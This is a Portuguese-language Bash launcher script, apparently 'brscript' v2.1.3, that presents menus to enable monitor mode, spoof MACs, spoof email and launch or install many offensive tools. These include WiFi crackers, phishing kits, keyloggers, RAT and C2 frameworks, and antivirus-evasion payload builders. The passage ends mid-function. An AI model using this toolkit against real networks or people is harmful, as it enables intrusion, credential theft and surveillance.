#! /bin/bash
VERSION=2.1.3
#Número de ferramentas com suporte a atalho de teclado
HOWMANYTOOLS=45
BACKL="0"
DONATIONS=3
LATESTCHANGELOGLINES=22
cd
#############PADRÕES###############
function defaults_l
{
#caminho para o brscript
	LPATH="/root/brscript"
	export LPATH
#caminho para atalhos de teclado
	KSPATH=""$LPATH"/ks"
	export KSPATH
#certificando-se de que o kspath está configurado
	if [[ ! -d "$KSPATH" ]]
	then
		mkdir "$KSPATH"
	fi
#CONFIGURAÇÃO DE APOIO ALFA
	if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
	then
		read ALFA < "$LPATH"/settings/AWUS036ACH.txt
	else
		ALFA="no"
	fi
#início amarelo
	YS="\e[1;33m"
#início azul 
	BS="\e[0;34m"
#fim de cor
	CE="\e[0m"
#início vermelho
	RS="\e[1;31m"
#começo preto
	BLS="\e[0;30m"
#início cinza escuro
	DGYS="\e[1;30m"
#início azul claro
	LBS="\e[1;34m"
#começo verde
	GNS="\e[0;32m"
#início verde claro
	LGNS="\e[1;32m"
#início ciano
	CYS="\e[0;36m"
#início ciano claro
	LCYS="\e[1;36m"
#início vermelho claro
	DRS="\e[0;31m"
#começo roxo
	PS="\e[0;35m"
#início do roxo claro
	LPS="\e[1;35m"
#início marrom
	BRS="\e[0;33m"
#início cinza claro
	LGYS="\e[0;37m"
#começo branco
	WHS="\e[1;37m"
#configuração de cor personalizada para o logotipo
	if [[ -f "$LPATH"/settings/logocolor.txt ]]
	then
		read COL < "$LPATH"/settings/logocolor.txt
	else
		COL="$RS"
	fi
#colocando stings frequentes
	YNYES="("$YS"s"$CE"/"$YS"n"$CE")("$YS"Digite"$CE"=sim)"
	YNNO="("$YS"s"$CE"/"$YS"n"$CE")("$YS"Digite"$CE"=não)"
	YNONLY="("$YS"s"$CE"/"$YS"n"$CE")"
	PAKT="Pressione "$YS"qualquer tecla$CE para"
	PAKTC="Pressione "$YS"qualquer tecla$CE para continuar..."
	PAKTGB="Pressione "$YS"qualquer tecla$CE para voltar"
	TNI=""$RS"A ferramenta não está instalada. Para instalar digite'"$CE""$YS"install"$CE""$RS"'."$CE""
#código para ler do teclado sem retorno
	READAK="read -n 1"
#MAC padrão ao iniciar o monitor
	DEFMAC="00:11:22:33:44:55"
	
	wififb="wififb"
}
##############FUNÇÕES#############
function local_ips()
{
	iffile=""$LPATH"/iftemp.txt"
	#passando uma interface se houver
	LF="$1"
	if [[ "$LF" = "" ]]
	then
		echo -e ""$BS"IPs Locais"$CE": "
		TEST=$(ifconfig | grep "$ETH:")
		n=0
		if [[ $TEST != "" ]]
		then
			ifconfig "$ETH" > $iffile
			LOCALETH=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			cho=$(is_it_an_ip $LOCALETH)
			if [[ "$cho" = 1 ]]
			then
				echo -e ""$ETH" = "$YS"$LOCALETH"$CE""
				n=1
			fi
		fi
		TEST=$(ifconfig | grep "$WLANN:")
		if [[ $TEST != "" ]]
		then
			ifconfig $WLANN > $iffile
			LOCALMA=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			cho=$(is_it_an_ip $LOCALMA)
			if [[ "$cho" = 1 ]]
			then
				echo -e "$WLANN = "$YS"$LOCALMA"$CE""
				n=1
			fi
		fi
		TEST=$(ifconfig | grep "$WLANNM:")
		if [[ $TEST != "" ]]
		then
			ifconfig $WLANNM > $iffile
			LOCALMO=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			cho=$(is_it_an_ip $LOCALMO)
			if [[ "$cho" = 1 ]]
			then
				echo -e "$WLANNM = "$YS"$LOCALMO"$CE""
				n=1
			fi
		fi
		if [[ "$n" = 0 ]]
		then
			echo -e ""$RS"Nenhuma interface conhecida disponível"$CE""
		fi
		echo -e ""
		find_gateways
	else
		TEST=$(ifconfig | grep "$LF:")
		if [[ $TEST != "" ]]
		then
			ifconfig $LF > $iffile
			LOCALM=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			cho=$(is_it_an_ip $LOCALM)
			if [[ "$cho" = 1 ]]
			then
				OUTPUT="$LOCALM"
				echo -e "$OUTPUT"
			fi
		fi
	fi
}
function give_ip_take_zero()
{
	#passing an ip
	GI1="$1"
	GI2="$2"
	if [[ "$GI1" = "" ]]
	then
		echo -e ""$RS"Erro 7. Nenhum parâmetro passou"$CE""
		sleep 3
	else
		ip1=$(echo -e "$GI1" | cut -d '.' -f1)
		ip2=$(echo -e "$GI1" | cut -d '.' -f2)
		ip3=$(echo -e "$GI1" | cut -d '.' -f3)
		if [[ "$GI2" = "" ]]
		then
			OUTPUT=""$ip1"."$ip2"."$ip3".0"
		else
			OUTPUT=""$ip1"."$ip2"."$ip3"."
		fi
			echo "$OUTPUT"
	fi
}
function is_it_an_ip()
{
	IIA=$1
	IIAI=${#IIA}
	if [[ "$IIA" = "" ]]
	then
		echo -e ""$RS"Erro 9. Não foram passados ​​parâmetros"
		sleep 2
	else
		if [[ "$IIAI" -le 15 && "$IIAI" -ge 7 ]]
		then
			echo 1
		else
			echo 0
		fi
	fi
}
function latest_changelog
{
	clear
	printf '\033]2;LATEST CHANGELOG\a'
	echo -e ""$BS"Bem vindo a versão $VERSION"$CE""
	echo -e "O que está incluso nessa atualização: "
	cat "$LPATH"/Changelog | head -n $LATESTCHANGELOGLINES
	echo -e "$PAKTC"
	$READAK
}
function finish 
{
  echo -e ""$RS"Modo extermínio detectado.."$CE""
}
function dash_calc
{
	
	size=${#TERMINALTITLE}
	calc=$(( 65-size ))
	calc=$(( calc/2 ))
	numcalc=1
	DASHESN="-"
	while [ $numcalc != $calc ]
	do
		DASHESN=""$DASHESN"-"
		numcalc=$(( numcalc+1 ))
	done
	echo -e "$DASHESN"$RS"$TERMINALTITLE"$CE"$DASHESN"
}
function managed_spaces
{
	size=${#WLANN}
	calc=$(( 11-size ))
	numcalc=1
	SPACESN=" "
	while [ $numcalc != $calc ]
	do
		SPACESN=""${SPACESN}" "
		numcalc=$(( numcalc+1 ))
	done
}
function monitor_spaces
{
	size=${#WLANNM}
	calc=$(( 11-size ))
	numcalc=1
	SPACESM=" "
	while [ $numcalc != $calc ]
	do
		SPACESM=""${SPACESM}" "
		numcalc=$(( numcalc+1 ))
	done
}
function check_wlans
{
	CC=$WLANN
	WLANCHECKING=$(ifconfig | grep "$WLANN" )
	#~ WLANCHECKING=$(ifconfig | awk -v c1="$CC" '$0 ~ c1 {print}')
	CC=$WLANNM
	WLANMCHECKING=$(ifconfig | grep "$WLANNM" )
	#~ WLANMCHECKING=$(ifconfig | awk -v c1="$CC" '$0 ~ c1 {print}')
}
function banner
{
	check_wlans
	echo -e ""

	echo -e "$COL     ██████╗ ██████╗     ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗ $CE"
    echo -e "$COL THE ██╔══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝ $CE"
    echo -e "$COL     ██████╔╝██████╔╝    ███████╗██║     ██████╔╝██║██████╔╝   ██║    $CE"
    echo -e "$COL     ██╔══██╗██╔══██╗    ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║    $CE"
    echo -e "$COL     ██████╔╝██║  ██║    ███████║╚██████╗██║  ██║██║██║        ██║    $CE"
    echo -e "$COL     ╚═════╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝    $CE"
	echo -e "$COL                   v$VERSION   by "$COL"BRUNO ROCHA                   $CE"
	echo -e "$COL                                                                      $CE"
	echo -e ""$YS"if"$CE") Ifconfig "$YS"l"$CE") IP local & Gateways "$RS"|"$CE"  "$YS"scan"$CE") Arp-scan na rede"
	if [[ "$WLANCHECKING" = "" ]]
	then
		echo -e ""$RS" 1"$CE") Ativar "$RS"$WLANN"$CE"${SPACESN}"$RS"d1"$CE") Desativar "$RS"$WLANN"$CE"${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") Iniciar modo monitor"
		echo -e ""$RS" 2"$CE") Ativar "$RS"$WLANNM"$CE"${SPACESM}"$RS"d2"$CE") Desativar "$RS"$WLANNM"$CE"${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") Parar modo monitor"
	else
		echo -e ""$YS" 1"$CE") Ativar $WLANN${SPACESN}"$YS"d1"$CE") Desativar $WLANN${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") Iniciar modo monitor"
		echo -e ""$YS" 2"$CE") Ativar $WLANNM${SPACESM}"$YS"d2"$CE") Desativar $WLANNM${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") Parar modo monitor"
	fi
	echo -e ""$YS" 3"$CE") Alterar MAC"
	echo -e ""$YS"d3"$CE") Restaurar MAC original"
	echo -e ""$YS"update"$CE") Procurar atualizações"
	if [[ -f /usr/bin/anonym8 ]]
	then
	echo -e ""$YS" 4"$CE") Ativar anonym8 - "$YS"d4"$CE") Desativar anonym8     "$RS"|"$CE" "$YS" errors"$CE") Corrigir possíveis erros"
	else
	echo -e ""$RS" 4"$CE") Ativar anonym8 - "$RS"d4"$CE") Desativar anonym8     "$RS"|"$CE" "$YS" errors"$CE") Corrigir possíveis erros"
	fi
	if [[ -f /usr/bin/anonsurf ]]
	then
	echo -e ""$YS" 5"$CE") Ativar anonsurf - "$YS"d5"$CE") Desativar anonsurf   "$RS"|"$CE" "$YS" ks"$CE") Atalhos do teclado"
	echo -e ""$YS" 6"$CE") Anonsurf's status - "$YS"d6"$CE") Reiniciar anonsurf "$RS"|"$CE" "$YS" d"$CE") Me paga um lanche"
	else
	echo -e ""$RS" 5"$CE") Ativar anonsurf - "$RS"d5"$CE") Desativar anonsurf   "$RS"|"$CE" "$YS"ks"$CE") Atalhos do teclado"
	echo -e ""$RS" 6"$CE") Anonsurf's status "$RS"d6"$CE") Reiniciar anonsurf   "$RS"|"$CE" "$YS"d"$CE") Me pague um refri"
	fi
	echo -e ""$YS" 7"$CE") Mostar o seu IP público                              "$RS"|"$CE"     "$YS"s"$CE") Ir para menu de configurações"
	echo -e ""$YS" 8"$CE") Ver MAC"
	echo -e ""$YS" 9"$CE") FERRAMENTAS             "$YS"15"$CE") Spoof EMAIL (MODO BETA)"
	if [[ -f /root/ngrok ]]
	then
		echo -e ""$YS"10"$CE") Handshake         "$YS"16"$CE") Ngrok modo porta reversa"
	else
		echo -e ""$YS"10"$CE") Handshake         "$RS"16"$CE") "$RS"Ngrok"$CE" porta reversa"
	fi
	if [[ -f /usr/local/bin/howdoi ]]
	then
		echo -e ""$YS"11"$CE") Encontrar pin do WPS      "$YS"17"$CE") Perguntas (Howdoi tool)"
	else
		echo -e ""$YS"11"$CE") Encontrar pin do WPS      "$RS"17"$CE") Perguntas ("$RS"Howdoi"$CE" tool)"
	fi
	echo -e ""$YS"12"$CE") WEP hacking       "$YS"18"$CE") Navegador de Auto-exploit"
	echo -e ""$YS"13"$CE") MITM              "$YS"19"$CE") Geolocar um IP"
	echo -e ""$YS"14"$CE") Metasploit   "   
	echo -e ""$YS" 0"$CE") SAIR"
	echo "Escolha: "
	read -e YORNAA
	clear
}
function enable_wlan
{
	O4=0
	echo -e "Ativando $WLANN..."
	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
	ifconfig $WLANN up &>/dev/null && echo -e ""$YS"Pronto"$CE"" && O4=1  || echo -e ""$RS"Deu erro fiote. Não consigo encontrar o seu adaptador sem fio"$CE""
}
function disable_wlan
{
	echo -e "Desativando $WLANN..."
	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
	ifconfig $WLANN down &>/dev/null && echo -e ""$YS"Pronto"$CE"" && O4=1 || echo -e ""$RS"Deu erro fiote. Não consigo encontrar o seu adaptador sem fio"$CE""
}
function interface_selection
{
if [[ "$WLANCHECKING" = "" ]]
then
	echo -e ""$RS" 1"$CE") $WLANN"
else
	echo -e ""$YS" 1"$CE") $WLANN"
fi
if [[ "$WLANMCHECKING" = "" ]]
then
	echo -e ""$RS" 2"$CE") $WLANNM"
else
	echo -e ""$YS" 2"$CE") $WLANNM"
fi
echo -e ""$YS" 3"$CE") "$ETH""
echo -e ""$YS" b"$CE") Menu principal"
echo -e ""$YS" 0"$CE") SAIR"
echo -e "Escolha: "
read -e MYINT
if [[ "$MYINT" = "2" ]]
then
	if [[ "$WLANMCHECKING" = "" ]]
	then
		MYINT="OFF"
	else
		MYINT="$WLANNM"
	fi
elif [[ "$MYINT" = "1" ]]
then
	if [[ "$WLANCHECKING" = "" ]]
	then
		MYINT="OFF"
	else
		MYINT="$WLANN"
	fi
elif [[ "$MYINT" = "0" ]]
then
	clear
	exit
elif [[ "$MYINT" = "00" || "$MYINT" = "b" ]]
then
	exec bash "$0"
elif [[ "$MYINT" = "3" ]]
then
	MYINT="$ETH"
else
echo -e "Escolha errada..."
sleep 2
clear
echo -e "SAINDO"
sleep 1
exec bash "$0"
fi
export MYINT
}
function change_mac
{
	interface_selection
	clear
	if [[ "$MYINT" = "OFF" ]]
	then
		echo -e "Interface não disponível"
		sleep 2
	else
		echo -e "Mudar para um aleatório ou específico?("$YS"a"$CE"/"$YS"e"$CE")("$YS"Digite"$CE"=r): "
		read -e RORS
		clear
		if [[ "$RORS" != "s" ]]
		then
			echo -e "Alterando o endereço MAC de $MYINT para um aleatório..."
			ifconfig $MYINT down
			macchanger -r $MYINT
			ifconfig $MYINT up
			echo -e "Pronto."
		else
			echo -e "Digite o MAC que você deseja:"
			read -e SMAC
			echo -e "Alterando o endereço MAC de $MYINT para $SMAC..."
			ifconfig $MYINT down
			macchanger -m $SMAC $MYINT
			ifconfig $MYINT up
			echo -e "Pronto."
		fi
	fi
}
function set_interface_number
{
clear
while true
do
echo -e "Digite o nome da sua interface sem fio no modo "$RS"gerenciado"$CE"("$YS"Digite"$CE"=wlan0): "
read MANAGED
if [[ "$MANAGED" = "" ]]
then
	MANAGED="wlan0"
fi
echo -e "Digite o nome da sua interface sem fio no modo "$RS"monitor"$CE"("$YS"Digite"$CE"=wlan0mon): "
read MONITOR
if [[ "$MONITOR" = "" ]]
then
	MONITOR="wlan0mon"
fi
echo -e "Digite o nome da sua interface com fio("$YS"Digite"$CE"="eth0"): "
read WIRED
if [[ "$WIRED" = "" ]]
then
	WIRED="eth0"
fi
	echo "$MANAGED" > "$LPATH"/wlan.txt
	echo "$MONITOR" > "$LPATH"/wlanmon.txt
	echo "$WIRED" > "$LPATH"/eth.txt
	echo -e ""$YS"Pronto"$CE""
	sleep 1
	clear
	echo -e ""$BS"Se você quiser alterar, digite "$CE""$YS"interface"$CE""$BS" a qualquer momento"$CE""
	sleep 3
	echo -e "$PAKTC"
	$READAK	
	BACKL="1"
	break
done
}
function checkifalready
{
	GOOD="1"
	num=1
	while [ $num -le 20 ]
	do
		if [[ "$CHECKKS" = "$num" ]]
		then
			GOOD="0"
			echo -e ""$RS"Esse atalho já está sendo usado pelo script."$CE""
			sleep 3
		fi
		num=$(( num+1 ))
	done
	if [[ "$GOOD" = "1" ]]
	then
		if [[ "$CHECKKS" = "etercheck" || "$CHECKKS" = "eternalblue" || "$CHECKKS" = "changelog" || "$CHECKKS" = "wififb" || "$CHECKKS" = "nessusstop" || "$CHECKKS" = "nessusstart" || "$CHECKKS" = "pstop" || "$CHECKKS" = "pstart" || "$CHECKKS" = "astop" || "$CHECKKS" = "astart" || "$CHECKKS" = "settings" || "$CHECKKS" = "donate" || "$CHECKKS" = "d" || "$CHECKKS" = "s" || "$CHECKKS" = "g" || "$CHECKKS" = "l" || "$CHECKKS" = "" || "$CHECKKS" = "if" || "$CHECKKS" = "ifconfig" || "$CHECKKS" = "interfaces" || "$CHECKKS" = "interface" || "$CHECKKS" = "errors" || "$CHECKKS" = "00" || "$CHECKKS" = "exit" || "$CHECKKS" = "update" || "$CHECKKS" = "d1" || "$CHECKKS" = "d2" || "$CHECKKS" = "d3" || "$CHECKKS" = "d4" || "$CHECKKS" = "d5" || "$CHECKKS" = "d6" || "$CHECKKS" = "d7" || "$CHECKKS" = "gg" || "$CHECKKS" = "ks" ]]
		then
			GOOD="0"
			echo -e ""$RS"Esse atalho já está sendo usado pelo script."$CE""
			sleep 3
		fi
	fi
	if [[ "$CHECKKS" = "delete" ]]
	then
		GOOD="0"
	fi
	#~ if [[ "$CHECKKS" = "b" || "$CHECKKS" = "back" ]]
	#~ then
		#~ GOOD="0"
	#~ fi
	if [[ "$GOOD" = "1" ]]
	then
		BACKUPTITLE="$TITLE"
		BACKUPNN="$nn"
		num=1
		while [[ $num -le "$HOWMANYTOOLS" ]]
		do
		nn="$num"
		listshortcuts
		if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]]
		then
			read KSIFALREADY < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$CHECKKS" == "$KSIFALREADY" ]]
			then
				echo -e ""$RS"Atalho '"$CHECKKS"' já está em uso pelo "$TITLE""$CE""
				GOOD=0
				sleep 3
			fi
		fi
		num=$(( num+1 ))
		done
		nn="$BACKUPNN"
		TITLE="$BACKUPTITLE"
	fi
	clear
}	
function createshortcut
{
if [[ ! -d ""$KSPATH"/$TITLE" ]]
then
	mkdir "$KSPATH"/"$TITLE"
fi
clear
echo -e "Digite o atalho do teclado que abrirá "$TITLE" no menu principal do brscript"
echo -e "(e.g: "$YS""$TITLE""$CE")"
echo -e "PAra deletar, digite:   "$YS"delete"$CE""
echo -e ""$YS" v"$CE") Voltar"
read CHECKKS
if [[ "$CHECKKS" = "back" || "$CHECKKS" = "b" ]]
then
	clear
	BACKKS=1
	break
else
	BACKKS=0
	if [[ "$BACKKS" == 0 ]]
	then
		CHECKKSBACKUP="$CHECKKS"
		NAMECDBACKUP="$NAMECD"
		KSSETBACKUP="$KSSET"
		checkifalready
		CHECKKS="$CHECKKSBACKUP"
		NAMECD="$NAMECDBACKUP"
		KSSET="$KSSETBACKUP"
		if [[ "$GOOD" = "1" ]]
		then
			echo -e "Shortcut is ok.Setting it up..."
			sleep 1
			echo "$CHECKKS" > "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			echo "$NAMECD" > "$KSPATH"/"$TITLE"/"$TITLE".txt
			echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
			echo -e "Pronto!"
			echo -e "$PAKTGB"
			$READAK
			clear
			#break
		else
			clear
			echo -e "Removendo atalho para "$TITLE"..."
			rm -r "$KSPATH"/"$TITLE"
			sleep 1
			echo -e "Pronto"
			echo -e "$PAKTGB"
			$READAK
			clear
			#break
		fi
	else
		break
	fi
fi
}
function listshortcuts
{	
	EXTRA1=""
	if [[ "$nn" = "1" ]]
	then
		TITLE="Fluxion"
		NAMECD="cd /root/fluxion"
		KSSET="./fluxion"
	elif [[ "$nn" = "2" ]]
	then
		TITLE="Zirikatu"
		NAMECD="cd /root/zirikatu"
		KSSET="./zirikatu.sh"
	elif [[ "$nn" = "3" ]]
	then
		TITLE="Wifite"
		NAMECD=""
		KSSET="wifite"
	elif [[ "$nn" = "4" ]]
	then
		TITLE="Wifiphisher"
		NAMECD=""
		KSSET="wifiphisher"
	elif [[ "$nn" = "5" ]]
	then
		TITLE="Zatacker"
		NAMECD="cd /root/Zatacker"
		KSSET="./ZT.sh"
	elif [[ "$nn" = "6" ]]
	then
		TITLE="Morpheus"
		NAMECD="cd /root/morpheus"
		KSSET="./morpheus.sh"
	elif [[ "$nn" = "7" ]]
	then
		TITLE="Hakku"
		NAMECD="cd /root/hakkuframework"
		KSSET="./hakku"
	elif [[ "$nn" = "8" ]]
	then
		TITLE="Trity"
		NAMECD=""
		KSSET="trity"
	elif [[ "$nn" = "9" ]]
	then
		TITLE="Cupp"
		NAMECD="cd /root/cupp"
		KSSET="python cupp.py -i"
	elif [[ "$nn" = "10" ]]
	then
		TITLE="Dracnmap"
		NAMECD="cd /root/Dracnmap"
		KSSET="./dracnmap-v*.sh"
	elif [[ "$nn" = "11" ]]
	then
		TITLE="Fern"
		NAMECD=""
		KSSET="fern-wifi-cracker"
	elif [[ "$nn" = "12" ]]
	then
		TITLE="KickThemOut"
		NAMECD="cd /root/kickthemout"
		KSSET="python kickthemout.py"
	elif [[ "$nn" = "13" ]]
	then
		TITLE="Ghost-Phisher"
		NAMECD=""
		KSSET="ghost-phisher"
	elif [[ "$nn" = "14" ]]
	then
		TITLE="Xerxes"
		NAMECD="cd /root/xerxes"
		KSSET="./xerxes"
	elif [[ "$nn" = "15" ]]
	then
		TITLE="Katana"
		NAMECD=""
		KSSET="ktf.console"
	elif [[ "$nn" = "16" ]]
	then
		TITLE="Airgeddon"
		NAMECD="cd /root/airgeddon"
		KSSET="./airgeddon.sh"
	elif [[ "$nn" = "17" ]]
	then
		TITLE="Websploit"
		NAMECD=""
		KSSET="websploit"
	elif [[ "$nn" = "18" ]]
	then
		TITLE="BeeLogger"
		NAMECD="cd /root/BeeLogger"
		KSSET="python bee.py"
	elif [[ "$nn" = "19" ]]
	then
		TITLE="Ezsploit"
		NAMECD="cd /root/exsploit"
		KSSET="./ezsploit.sh"
	elif [[ "$nn" = "20" ]]
	then
		TITLE="Pupy"
		NAMECD="cd /root/pupy/pupy"
		KSSET="./pupysh.py"
	elif [[ "$nn" = "21" ]]
	then
		TITLE="TheFatRat"
		NAMECD="cd /root/TheFatRat"
		KSSET="./fatrat"
	elif [[ "$nn" = "22" ]]
	then
		TITLE="Angry_IP_Scanner"
		NAMECD=" "
		KSSET="ipscan & disown"
	#~ elif [[ "$nn" = "23" ]]
	#~ then
		#~ TITLE="Sniper"
		#~ NAMECD='read -p 'DOMAIN:' DOMAIN'
		#~ KSSET="sniper $DOMAIN"
	elif [[ "$nn" = "23" ]]
	then
		TITLE="ReconDog"
		NAMECD="cd /root/ReconDog"
		KSSET="python dog.py"
	elif [[ "$nn" = "24" ]]
	then
		TITLE="RED_HAWK"
		NAMECD="cd /root/RED_HAWK"
		KSSET="php rhawk.php"
	elif [[ "$nn" = "25" ]]
	then
		TITLE="Winpayloads"
		NAMECD="cd /root/Winpayloads"
		KSSET="./WinPayloads.py"
	elif [[ "$nn" = "26" ]]
	then
		TITLE="CHAOS"
		NAMECD="cd /root/CHAOS"
		KSSET="go run CHAOS.go"
	elif [[ "$nn" = "27" ]]
	then
		TITLE="Routersploit"
		NAMECD="cd /root/routersploit"
		KSSET="./rsf.py"
	elif [[ "$nn" = "28" ]]
	then
		TITLE="nWatch"
		NAMECD="cd /root/nWatch"
		KSSET="python nwatch.py"
	elif [[ "$nn" = "29" ]]
	then
		TITLE="Eternal_scanner"
		NAMECD="cd /root/eternal_scanner"
		KSSET="./escan"
	elif [[ "$nn" = "30" ]]
	then
		TITLE="LALIN"
		NAMECD="cd /root/LALIN"
		KSSET="./Lalin.sh"
	elif [[ "$nn" = "31" ]]
	then
		TITLE="Shellter"
		NAMECD=""
		KSSET="shellter"
	elif [[ "$nn" = "32" ]]
	then
		TITLE="Netattack2"
		NAMECD="cd /root/netattack2"
		KSSET="python2 netattack2.py"
	elif [[ "$nn" = "33" ]]
	then
		TITLE="Operative-framework"
		NAMECD="cd /root/operative-framework"
		KSSET="python operative.py"
	elif [[ "$nn" = "34" ]]
	then
		TITLE="Koadic"
		NAMECD="cd /root/koadic"
		KSSET="./koadic"
	elif [[ "$nn" = "35" ]]
	then
		TITLE="Empire"
		NAMECD="cd /root/Empire"
		KSSET="./empire"
	elif [[ "$nn" = "36" ]]
	then
		TITLE="Meterpreter_Paranoid_Mode"
		NAMECD="cd /root/Meterpreter_Paranoid_Mode-SSL"
		KSSET="./Meterpreter_Paranoid_Mode.sh"
	elif [[ "$nn" = "37" ]]
	then
		TITLE="Wifi-Pumpkin"
		NAMECD=""
		KSSET="wifi-pumpkin"
	elif [[ "$nn" = "38" ]]
	then
		TITLE="Veil"
		NAMECD="cd /root/Veil"
		KSSET="./Veil.py"
	elif [[ "$nn" = "39" ]]
	then
		TITLE="Leviathan"
		NAMECD="cd /root/leviathan"
		KSSET="python leviathan.py"
	elif [[ "$nn" = "40" ]]
	then
		TITLE="Gloom-Framework"
		NAMECD="cd /root/Gloom-Framework"
		KSSET="python gloom.py"
	elif [[ "$nn" = "41" ]]
	then
		TITLE="Arcanus"
		NAMECD="cd /root/ARCANUS"
		KSSET="./ARCANUS"
	elif [[ "$nn" = "42" ]]
	then
		TITLE="LFISuite"
		NAMECD="cd /root/LFISuite"
		KSSET="python lfisuite.py"
	elif [[ "$nn" = "43" ]]
	then
		TITLE="DKMC"
		NAMECD="cd /root/DKMC"
		KSSET="python dkmc.py"
	elif [[ "$nn" = "44" ]]
	then
		TITLE="SecHub"
		NAMECD=""
		KSSET="sechub"
	elif [[ "$nn" = "45" ]]
	then
		TITLE="Beef-xss"
		NAMECD="cd /usr/share/beef-xss"
		KSSET="./beef"
	fi
}
function reinstall_tools
{
while true
do
	cd
	clear
	TERMINALTITLE="INSTALL/REINSTALL A TOOL"
	dash_calc
	printf '\033]2;INSTALL/REINSTALL A TOOL\a'
	echo -e "Selecione uma ferramenta para instalar ou reinstalar"
	echo -e " "$YS"1"$CE") Fluxion      "$YS"21"$CE") 4nonimizer    "$YS"41"$CE") Infoga           "$YS"61"$CE") Wifi-Pumpkin"
	echo -e ""$YS" 2"$CE") Wifite       "$YS"22"$CE") Openvas       "$YS"42"$CE") nWatch           "$YS"62"$CE") Veil-Framework"
	echo -e ""$YS" 3"$CE") Wifiphisher  "$YS"23"$CE") BeeLogger     "$YS"43"$CE") Eternal scanner  "$YS"63"$CE") Leviathan"
	echo -e ""$YS" 4"$CE") Zatacker     "$YS"24"$CE") Ezsploit      "$YS"44"$CE") Eaphammer        "$YS"64"$CE") FakeImageExploiter"
	echo -e ""$YS" 5"$CE") Morpheus     "$YS"25"$CE") Pupy          "$YS"45"$CE") Dagon            "$YS"65"$CE") Avet"
	echo -e ""$YS" 6"$CE") Osrfconsole  "$YS"26"$CE") Zirikatu      "$YS"46"$CE") Lalin            "$YS"66"$CE") Gloom"
	echo -e ""$YS" 7"$CE") Hakku        "$YS"27"$CE") WiFi-autopwner"$YS"47"$CE") Knockmail        "$YS"67"$CE") Arcanus"
	echo -e ""$YS" 8"$CE") Trity        "$YS"28"$CE") Bully         "$YS"48"$CE") Kwetza           "$YS"68"$CE") MSFPC"
	echo -e ""$YS" 9"$CE") Cupp         "$YS"29"$CE") Anonsurf      "$YS"49"$CE") Ngrok            "$YS"69"$CE") MorphHTA"
	echo -e ""$YS"10"$CE") Dracnmap     "$YS"30"$CE") Anonym8       "$YS"50"$CE") Bleachbit        "$YS"70"$CE") LFISuite"
	echo -e ""$YS"11"$CE") Fern         "$YS"31"$CE") TheFatRat     "$YS"51"$CE") Vmr mdk          "$YS"71"$CE") UniByAv"
	echo -e ""$YS"12"$CE") Netdiscover  "$YS"32"$CE") Angry IP      "$YS"52"$CE") Hash Buster      "$YS"72"$CE") Demiguise"
	echo -e ""$YS"13"$CE") KickThemOut  "$YS"33"$CE") Sniper        "$YS"53"$CE") Findsploit       "$YS"73"$CE") Dkmc"
	echo -e ""$YS"14"$CE") Ghost-Phisher"$YS"34"$CE") ReconDog      "$YS"54"$CE") Howdoi           "$YS"74"$CE") MITMf"
	echo -e ""$YS"15"$CE") The Eye      "$YS"35"$CE") RED HAWK      "$YS"55"$CE") Operative-frmwork"
	echo -e ""$YS"16"$CE") Xerxes       "$YS"36"$CE") WinPayloads   "$YS"56"$CE") Netattack2"
	echo -e ""$YS"17"$CE") Mdk3-master  "$YS"37"$CE") Shellter      "$YS"57"$CE") Koadic"
	echo -e ""$YS"18"$CE") Katana       "$YS"38"$CE") CHAOS         "$YS"58"$CE") Empire"
	echo -e ""$YS"19"$CE") Airgeddon    "$YS"39"$CE") Routersploit  "$YS"59"$CE") Meterpr.-Paranoid"
	echo -e ""$YS"20"$CE") Websploit    "$YS"40"$CE") Geany         "$YS"60"$CE") Dr0p1t"
	echo -e ""$YS" b"$CE") Voltar"
	echo -e ""$YS" 0"$CE") Sair"
	echo -e "Escolha: "
	read REIN
	clear
	if [[ "$REIN" = "1" ]]
	then
		install_fluxion		
	elif [[ "$REIN" = "2" ]]
	then
		install_wifite
	elif [[ "$REIN" = "3" ]]
	then
		install_wifiphisher
	elif [[ "$REIN" = "4" ]]
	then
		install_zatacker
	elif [[ "$REIN" = "5" ]]
	then
		install_morpheus
	elif [[ "$REIN" = "6" ]]
	then
		install_osrframework			
	elif [[ "$REIN" = "7" ]]
	then
		install_hakku
	elif [[ "$REIN" = "8" ]]
	then
		install_trity
	elif [[ "$REIN" = "9" ]]
	then
		install_cupp
	elif [[ "$REIN" = "10" ]]
	then
		install_dracnmap
	elif [[ "$REIN" = "11" ]]
	then
		install_fern
	elif [[ "$REIN" = "12" ]]
	then
		install_netdiscover		
	elif [[ "$REIN" = "13" ]]
	then
		install_kickthemout
	elif [[ "$REIN" = "14" ]]
	then
		install_ghostphisher
	elif [[ "$REIN" = "15" ]]
	then
		install_theeye
	elif [[ "$REIN" = "16" ]]
	then
		install_xerxes
	elif [[ "$REIN" = "17" ]]
	then
		install_mdk3
	elif [[ "$REIN" = "18" ]]
	then
		install_katana
	elif [[ "$REIN" = "19" ]]
	then
		install_airgeddon
	elif [[ "$REIN" = "20" ]]
	then
		install_websploit
	elif [[ "$REIN" = "21" ]]
	then
		install_4nonimizer
	elif [[ "$REIN" = "22" ]]
	then
		install_openvas
	elif [[ "$REIN" = "23" ]]
	then
		install_beelogger
	elif [[ "$REIN" = "24" ]]
	then
		install_ezsploit
	elif [[ "$REIN" = "25" ]]
	then
		install_pupy
	elif [[ "$REIN" = "26" ]]
	then
		install_zirikatu
	elif [[ "$REIN" = "27" ]]
	then
